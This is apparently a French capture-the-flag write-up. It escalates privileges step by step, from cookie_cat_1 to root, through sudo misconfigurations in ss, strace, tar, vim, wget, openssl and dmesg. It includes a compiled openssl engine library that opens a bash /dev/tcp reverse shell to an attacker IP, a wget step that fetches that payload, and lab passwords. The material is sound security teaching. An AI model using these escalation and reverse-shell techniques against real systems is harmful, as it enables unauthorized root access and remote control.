# Chaîne d'escalade de privilèges - Challenge Cookie Cat

**Informations de connexion initiale :**
- IP : `10.40.40.101`
- Port SSH : `2222`
- Utilisateur : `cookie_cat_1`

---

## Reconnaissance

### Connexion initiale

```bash
ssh cookie_cat_1@10.40.40.101 -p 2222
```

### Vérification des permissions sudo

```bash
sudo -l
```

---

## Escalade de privilèges : cookie_cat_1 → cookie_cat_2

### Analyse des permissions

```bash
sudo -l
```

**Résultat :**
```
User cookie_cat_1 may run the following commands:
    (cookie_cat_2) NOPASSWD: /usr/bin/ss *
```

### Exploitation avec ss

Le binaire `ss` permet de lire des fichiers via l'option `-F` (file). D'après [GTFOBins](https://gtfobins.github.io/gtfobins/ss/), on peut exfiltrer le contenu d'un fichier.

```bash
sudo -u cookie_cat_2 ss -a -F /home/cookie_cat_2/password
```

**Résultat :**
```
Error: "O8oVjKYzO5dlU7wS5gt2qwlyBRs3LsHF8ZhRJnO17hrovLZd4EfQmtia1bOq9wYR" does not look like a port.
```

Le message d'erreur révèle le mot de passe ! 

> **✅ Password cookie_cat_2**
> 
> `O8oVjKYzO5dlU7wS5gt2qwlyBRs3LsHF8ZhRJnO17hrovLZd4EfQmtia1bOq9wYR`

```bash
su cookie_cat_2
```

---

## Escalade de privilèges : cookie_cat_2 → cookie_cat_3

### Analyse des permissions

```bash
sudo -l
```

**Résultat :**
```
User cookie_cat_2 may run the following commands:
    (cookie_cat_3) NOPASSWD: /usr/bin/strace *
```

### Exploitation avec strace

> **ℹ️ Info**
> 
> `strace` permet de tracer les appels système. On peut l'utiliser pour lire des fichiers en traçant un programme qui lit le fichier cible.

```bash
sudo -u cookie_cat_3 strace -s 4096 /bin/cat /home/cookie_cat_3/password 2>&1 | grep -A 10 read
```

**Résultat extrait :**
```
read(3, "cookie_cat_3:PAymH4vUhi2RFcgr8AZiolFChGR3odo6C4UOKfI67nV7fI1pfe9Kjrt87Nl2GyN6\n", 131072) = 78
```

> **✅ Password cookie_cat_3**
> 
> `PAymH4vUhi2RFcgr8AZiolFChGR3odo6C4UOKfI67nV7fI1pfe9Kjrt87Nl2GyN6`

```bash
su cookie_cat_3
```

---

## Escalade de privilèges : cookie_cat_3 → cookie_cat_4

### Analyse des permissions

```bash
sudo -l
```

**Résultat :**
```
User cookie_cat_3 may run the following commands:
    (cookie_cat_4) NOPASSWD: /usr/bin/tar *
```

### Exploitation avec tar

D'après [GTFOBins](https://gtfobins.github.io/gtfobins/tar/), `tar` peut exécuter des commandes arbitraires via les options `--checkpoint` et `--checkpoint-action`.

```bash
sudo -u cookie_cat_4 tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

> **✅ Shell cookie_cat_4**
> 
> Shell obtenu en tant que cookie_cat_4

---

## Escalade de privilèges : cookie_cat_4 → cookie_cat_5

### Analyse des permissions

```bash
sudo -l
```

**Résultat :**
```
User cookie_cat_4 may run the following commands:
    (cookie_cat_5) NOPASSWD: /usr/bin/vim *
```

### Exploitation avec vim

Vim permet d'exécuter des commandes shell via la commande `:!`.

```bash
sudo -u cookie_cat_5 vim
```

Dans vim, taper :
```vim
:!/bin/bash
```

> **✅ Shell cookie_cat_5**
> 
> Shell obtenu en tant que cookie_cat_5

---

## Escalade de privilèges : cookie_cat_5 → cookie_cat_6

### Analyse des permissions

```bash
sudo -l
```

**Résultat :**
```
User cookie_cat_5 may run the following commands:
    (cookie_cat_6) NOPASSWD: /usr/bin/wget *
```

### Exploitation avec wget

D'après [GTFOBins](https://gtfobins.github.io/gtfobins/wget/), `wget` peut exécuter un script via l'option `--use-askpass`.

```bash
cd /tmp
TF=/dev/shm/script.sh
echo -e '#!/bin/sh\n/bin/sh 1>&0' > $TF
chmod +x $TF
sudo -u cookie_cat_6 wget --use-askpass=$TF 0
```

> **✅ Shell cookie_cat_6**
> 
> Shell obtenu en tant que cookie_cat_6

---

## Escalade de privilèges : cookie_cat_6 → cookie_cat_7

### Analyse des permissions

```bash
sudo -l
```

**Résultat :**
```
User cookie_cat_6 may run the following commands on 54412704bfd4:
    (cookie_cat_7) NOPASSWD: /usr/bin/openssl s_server *, /usr/bin/openssl req *, /usr/bin/openssl s_client *
```

### Exploitation avec OpenSSL Engine

OpenSSL permet de charger des bibliothèques dynamiques personnalisées via l'option `-engine`. On va créer une bibliothèque malveillante qui exécute un reverse shell.

#### Création de l'exploit

**Sur la machine attaquante (Exegol) :**

```c
cat > shell.c << 'EOF'
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id) {
    setuid(1006);
    setgid(1006);
    system("/bin/bash -c 'bash -i >& /dev/tcp/10.40.40.53/7777 0>&1'");
    return 1;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
EOF
```

#### Compilation

```bash
gcc -fPIC -o shell.o -c shell.c
gcc -shared -o shell.so -lcrypto shell.o
```

#### Servir le fichier

```bash
python3 -m http.server 8000
```

#### Listener sur la machine attaquante

```bash
nc -lvnp 7777
```

#### Téléchargement et exécution sur la cible

```bash
cd /dev/shm
wget http://10.40.40.53:8000/shell.so -O /dev/shm/shell.so
sudo -u cookie_cat_7 /usr/bin/openssl req -engine /dev/shm/shell.so
```

> **💡 Note importante**
> 
> Le fichier doit être placé dans `/dev/shm` car `/tmp` est monté avec l'option `noexec` qui empêche l'exécution de bibliothèques partagées.

> **✅ Reverse Shell cookie_cat_7**
> 
> Reverse shell obtenu en tant que cookie_cat_7

---

## Escalade de privilèges finale : cookie_cat_7 → root

### Analyse des permissions

```bash
sudo -l
```

**Résultat :**
```
User cookie_cat_7 may run the following commands on 54412704bfd4:
    (root) NOPASSWD: /usr/bin/dmesg
```

### Exploitation avec dmesg

D'après [GTFOBins](https://gtfobins.github.io/gtfobins/dmesg/), `dmesg` peut lire des fichiers arbitraires via l'option `-F`.

```bash
sudo /usr/bin/dmesg -F /root/flag.txt
```

**Résultat :**
```
[    0.000000] COOKIE{cl4ssic_sud0_misc0nf}
```
